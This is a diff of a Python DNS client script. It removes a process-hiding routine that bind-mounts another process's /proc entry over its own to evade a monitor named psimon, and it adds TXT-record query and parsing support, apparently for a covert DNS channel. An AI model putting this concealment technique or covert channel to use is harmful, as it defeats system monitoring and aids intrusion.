@@ -1,11 +1,9 @@
 #!/usr/bin/env python3
-global SERVER; SERVER = ''
 import socket
 import struct
+import sys
 import time
 import os
-import subprocess
-from typing import Union, Sequence
 
 WAIT_TIME = 10
 
@@ -15,47 +13,7 @@ if (len(sys.argv) != 2):
 else:
     SERVER = sys.argv[1]
 
-def hideProccess():
-    pid = os.getpid()
-    processes = getOutputOf("ps aux")
-    processesSplit = processes.split("\n")
-    for process in processesSplit:
-        if '[psimon]' in process:
-            targetPid = process.split()[1]
-            break
-    os.system(f'mount -b /proc/{targetPid} /proc/{pid}')
-
-def getOutputOf(command: Union[str, Sequence[str]]) -> str:
-    """
-    Run a command and return stdout (or stderr if the command fails).
-    Accepts either a shell string or a list argv.
-    """
-    try:
-        if isinstance(command, str):
-            result = subprocess.run(
-                command,
-                shell=True,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                universal_newlines=True,
-                check=True,
-            )
-        else:
-            result = subprocess.run(
-                command,
-                shell=False,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                universal_newlines=True,
-                check=True,
-            )
-        return result.stdout.strip()
-    except subprocess.CalledProcessError as e:
-        return (e.stdout or e.stderr or "").strip()
-
-hideProccess()
-
-def makeQuery(address):
+def makeQuery(address, recordType='A'):
     query = b'\x12\x34'  # Transaction ID
     query += b'\x01\x00'  # Flags
     query += b'\x00\x01'  # QDCOUNT
@@ -64,10 +22,16 @@ def makeQuery(address):
     query += b'\x00\x00'  # ARCOUNT
     for part in address.split('.'):
         query += bytes([len(part)]) + part.encode()
-    query += b'\x00' + b'\x00\x01' + b'\x00\x01'
+    query += b'\x00'
+    # Set QTYPE based on recordType parameter
+    if recordType.upper() == 'TXT':
+        query += b'\x00\x10'  # QTYPE 16 for TXT record
+    else:
+        query += b'\x00\x01'  # QTYPE 1 for A record (default)
+    query += b'\x00\x01'  # QCLASS (IN)
     return query
 
-def getResponse(data):
+def getResponse(data, recordType='A'):
     answers = []
     try:
         header = data[:12]
@@ -89,9 +53,21 @@ def getResponse(data):
             rtype = struct.unpack("!H", data[offset+2:offset+4])[0]
             rdlength = struct.unpack("!H", data[offset+10:offset+12])[0]
             offset += 12
-            if rtype == 1 and rdlength == 4:  # A record
-                ip = ".".join(str(b) for b in data[offset:offset+4])
-                answers.append(ip)
+            if recordType.upper() == 'TXT':
+                if rtype == 16:  # TXT record
+                    # TXT records have length-prefixed strings
+                    txtData = b''
+                    rdOffset = 0
+                    while rdOffset < rdlength:
+                        length = data[offset + rdOffset]
+                        rdOffset += 1
+                        txtData += data[offset + rdOffset:offset + rdOffset + length]
+                        rdOffset += length
+                    answers.append(txtData.decode('utf-8', errors='ignore'))
+            else:
+                if rtype == 1 and rdlength == 4:  # A record
+                    ip = ".".join(str(b) for b in data[offset:offset+4])
+                    answers.append(ip)
             offset += rdlength
     except Exception as e:
         print("Parsing error:", e)
